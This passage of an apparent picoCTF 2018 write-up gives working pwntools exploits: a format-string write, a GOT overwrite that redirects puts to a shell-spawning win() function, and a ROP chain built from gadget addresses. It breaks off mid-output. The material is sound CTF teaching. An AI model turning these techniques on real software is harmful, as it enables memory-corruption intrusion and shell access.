<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>import</span> pwn
<span style=color:#6272a4>#pwn.context.log_level = &#39;critical&#39;</span>

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>

h, p <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#bd93f9>43438</span>
elf <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>ELF(<span style=color:#f1fa8c>&#39;./auth&#39;</span>)

pwn<span style=color:#ff79c6>.</span>log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;sym.authenticate: </span><span style=color:#f1fa8c>{:02X}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;authenticated&#39;</span>]))

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process</span>():
    <span style=color:#ff79c6>if</span> DEV:
        <span style=color:#ff79c6>return</span> elf<span style=color:#ff79c6>.</span>process()
    <span style=color:#ff79c6>else</span>:
        <span style=color:#ff79c6>return</span> pwn<span style=color:#ff79c6>.</span>remote(h, p)


<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>manual</span>():
    payload <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;authenticated&#39;</span>])
    <span style=color:#6272a4>#payload += &#39;%p&#39;*11</span>
    <span style=color:#6272a4>#payload += &#39;%11$p&#39;</span>
    payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;%11$n&#39;</span>

    s <span style=color:#ff79c6>=</span> get_process()
    prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;no)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
    s<span style=color:#ff79c6>.</span>sendline(payload)
    prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recv()
    <span style=color:#8be9fd;font-style:italic>print</span> (prompt)
    <span style=color:#ff79c6>return</span>


<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>bruteforce</span>():
    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
      payload <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;authenticated&#39;</span>])
      payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;%&#39;</span><span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(i)<span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;$n&#39;</span>
      s <span style=color:#ff79c6>=</span> get_process()
      prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;no)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
      s<span style=color:#ff79c6>.</span>sendline(payload)
      prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recv()
      s<span style=color:#ff79c6>.</span>close()
      <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;pico&#39;</span> <span style=color:#ff79c6>in</span> prompt:
          <span style=color:#8be9fd;font-style:italic>print</span> (<span style=color:#8be9fd;font-style:italic>str</span>(i) <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39; : &#39;</span> <span style=color:#ff79c6>+</span> payload <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39; : &#39;</span> <span style=color:#ff79c6>+</span>prompt)
          <span style=color:#ff79c6>break</span>
      <span style=color:#ff79c6>return</span>

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>the_pwn_way</span>():
    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>exec_fmt</span>(payload):
        proc <span style=color:#ff79c6>=</span> get_process()
        proc<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#34;(yes/no)&#34;</span>, payload)
        <span style=color:#ff79c6>return</span> proc<span style=color:#ff79c6>.</span>recvall()
    autofmt <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>FmtStr(exec_fmt)
    writes <span style=color:#ff79c6>=</span> {elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;authenticated&#39;</span>]:   <span style=color:#bd93f9>1</span>}
    payload <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>fmtstr_payload(autofmt<span style=color:#ff79c6>.</span>offset, writes)
    pwn<span style=color:#ff79c6>.</span>log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Payload: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(pwn<span style=color:#ff79c6>.</span>enhex(payload)))
    <span style=color:#8be9fd;font-style:italic>print</span> exec_fmt(payload)
    <span style=color:#ff79c6>return</span>


<span style=color:#6272a4>#python -c &#39;print &#34;\x4c\xa0\x04\x08%11$n&#34;&#39; | nc 2018shell.picoctf.com 43438</span>
<span style=color:#6272a4>#bruteforce()</span>
<span style=color:#6272a4>#manual();</span>
the_pwn_way()
</code></pre></td></tr></table>
</div>
</div><h2 id=got-shell>got-shell</h2>
<ul>
<li>source: <a href=./resources/got-shell/auth>auth.c</a></li>
<li>binary: <a href=./resources/got-shell/auth>auth</a></li>
</ul>
<p>Executing the win() function will give us a shell</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>win</span>() {
  system(<span style=color:#f1fa8c>&#34;/bin/sh&#34;</span>);
}
</code></pre></td></tr></table>
</div>
</div><ol>
<li>The program prompt us to input two 4 bytes addresses: <strong>address</strong> and <strong>value</strong></li>
<li>Then the program will overwrite the content at <strong>address</strong> with our <strong>value</strong></li>
<li>After overwriting the address, there is two calls before the end of the program: puts and exit</li>
<li>Our strategy is to overwrite either the address of the puts() function or the exit() function with the address of win()</li>
</ol>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#ff79c6>*</span>(<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> <span style=color:#ff79c6>*</span>)address <span style=color:#ff79c6>=</span> value;
puts(<span style=color:#f1fa8c>&#34;Okay, exiting now...</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
exit(<span style=color:#bd93f9>1</span>);
</code></pre></td></tr></table>
</div>
</div><p>exploit below:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>import</span> pwn

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1</span>

prgm <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;./auth&#39;</span>
host, port <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#bd93f9>3582</span>
elf <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>ELF(prgm)

value <span style=color:#ff79c6>=</span> elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;win&#39;</span>]
address <span style=color:#ff79c6>=</span> elf<span style=color:#ff79c6>.</span>got[<span style=color:#f1fa8c>&#39;puts&#39;</span>]
<span style=color:#8be9fd;font-style:italic>print</span> <span style=color:#f1fa8c>&#34;Overwriting puts 0x</span><span style=color:#f1fa8c>{:02X}</span><span style=color:#f1fa8c> with win 0x</span><span style=color:#f1fa8c>{:02X}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(address, value)

<span style=color:#ff79c6>if</span> DEV:
    s <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>process(prgm)
<span style=color:#ff79c6>else</span>:
    s <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>remote(host, port)

s<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;value?&#39;</span>)
s<span style=color:#ff79c6>.</span>sendline(<span style=color:#8be9fd;font-style:italic>hex</span>(address))
s<span style=color:#ff79c6>.</span>sendline(<span style=color:#8be9fd;font-style:italic>hex</span>(value))
prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recv()
<span style=color:#8be9fd;font-style:italic>print</span> prompt

s<span style=color:#ff79c6>.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id=rop-chain>rop-chain</h2>
<ul>
<li>source: <a href=./resources/rop-chain/rop.c>rop.c</a></li>
<li>binary: <a href=./resources/rop-chain/rop>rop</a></li>
<li><a href=http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html>codearcana</a> is a great resource to learn rop chain</li>
</ul>
<p>This code has a vuln() function which has a char buf[16] buffer vulnerable to overflow.</p>
<p>The stack of the vuln function before exploitation:</p>
<pre><code>+---------------+
|   RET TO MAIN	|	EBP+4
+---------------+
|    OLD EBP	| &lt;-- 	EBP
+---------------+
|    ????       |
+---------------+
|               |
|    buf[16]	|
|               |	EBP-0x18 (offset=24 is obtained with radare)
+---------------+
</code></pre>
<p>As per the below code, there is a certain sequence of function calls needed to exploit this overflow and print the flag.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>bool</span> win1 <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>false</span>;
<span style=color:#8be9fd>bool</span> win2 <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>false</span>;

<span style=color:#8be9fd>void</span> <span style=color:#50fa7b>win_function1</span>() {
  win1 <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>true</span>;
}

<span style=color:#8be9fd>void</span> <span style=color:#50fa7b>win_function2</span>(<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> arg_check1) {
  <span style=color:#ff79c6>if</span> (win1 <span style=color:#ff79c6>&amp;&amp;</span> arg_check1 <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0xBAAAAAAD</span>) {
    win2 <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>true</span>;
  }
  [...]
}

<span style=color:#8be9fd>void</span> <span style=color:#50fa7b>flag</span>(<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> arg_check2) {
  [...]
  <span style=color:#ff79c6>if</span> (win1 <span style=color:#ff79c6>&amp;&amp;</span> win2 <span style=color:#ff79c6>&amp;&amp;</span> arg_check2 <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>0xDEADBAAD</span>) {
    printf(<span style=color:#f1fa8c>&#34;%s&#34;</span>, flag);
    <span style=color:#ff79c6>return</span>;
  }
}
</code></pre></td></tr></table>
</div>
</div><p>We can use a ROP chain with the below sequence:</p>
<ol>
<li>First we need to call the win_function1() to set the boolean win1 to true</li>
<li>Then we need to call win_function2(0xBAAAAAAD) to set boolean win2 to true</li>
<li>Then we need to call flag(0xDEADBAAD)</li>
</ol>
<p>The stack after the Rop chain will looks like:</p>
<pre><code>+---------------+
| 0xDEADBAAD	|	ROP+0x18 (arg for flag function)
+---------------+
|     JUNK      |	ROP+0x14 junk return address
+---------------+
|     flag      |	ROP+0x10
+---------------+
| 0xBAAAAAAD	|	ROP+0xC	(arg for win_function2)
+---------------+
|&amp;(pop ebx; ret)|	ROP+0x8 (address of pop ebx; ret) obtained with objdump
+---------------+
| win_function2	|	ROP+0x4
+---------------+
| win_function1	|	EBP+4 = ROP start
+---------------+
|     AAAA      | &lt;-- 	EBP
+---------------+
|     AAAA      |
+---------------+
|     AAAA      |
|     AAAA      |
|     AAAA      |
|     AAAA      |	EBP-0x18 (offset=24 is obtained with radare)
+---------------+
</code></pre>
<p>To find the address of the gadget <code>pop ebp; ret</code>, we can use <code>objdump -d &lt;binary_name></code> :</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
804840d:	5b                   	pop    %ebx
804840e:	c3                   	ret
<span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
8048806:	5b                   	pop    %ebx
8048807:	c3                   	ret
<span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</code></pre></td></tr></table>
</div>
</div><p>Our payload looks like that:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>elf <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./rop&#39;</span>)
payload <span style=color:#ff79c6>=</span> p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;win_function1&#39;</span>])
payload <span style=color:#ff79c6>+=</span> p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;win_function2&#39;</span>])
payload <span style=color:#ff79c6>+=</span> p32(<span style=color:#bd93f9>0x804840d</span>)   <span style=color:#6272a4>#address of pop ebx; ret</span>
payload <span style=color:#ff79c6>+=</span> p32(<span style=color:#bd93f9>0xBAAAAAAD</span>)
payload <span style=color:#ff79c6>+=</span> p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;flag&#39;</span>])
payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;JUNK&#39;</span>
payload <span style=color:#ff79c6>+=</span> p32(<span style=color:#bd93f9>0xDEADBAAD</span>)
</code></pre></td></tr></table>
</div>
</div><p>pwntools has a ROP object which simplify by finding and adding automatically gadgets we need.
Also syntax for building the rop chain is much more straight forward and readable:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>elf <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./rop&#39;</span>)
rop_chain <span style=color:#ff79c6>=</span> ROP(elf)
rop_chain<span style=color:#ff79c6>.</span>win_function1()
rop_chain<span style=color:#ff79c6>.</span>win_function2(<span style=color:#bd93f9>0xBAAAAAAD</span>)
rop_chain<span style=color:#ff79c6>.</span>flag(<span style=color:#bd93f9>0xDEADBAAD</span>)
<span style=color:#8be9fd;font-style:italic>print</span> rop_chain<span style=color:#ff79c6>.</span>dump()

<span style=color:#bd93f9>0x0000</span>:        <span style=color:#bd93f9>0x80485cb</span> win_function1()
<span style=color:#bd93f9>0x0004</span>:        <span style=color:#bd93f9>0x80485d8</span> win_function2(<span style=color:#bd93f9>0xbaaaaaad</span>)
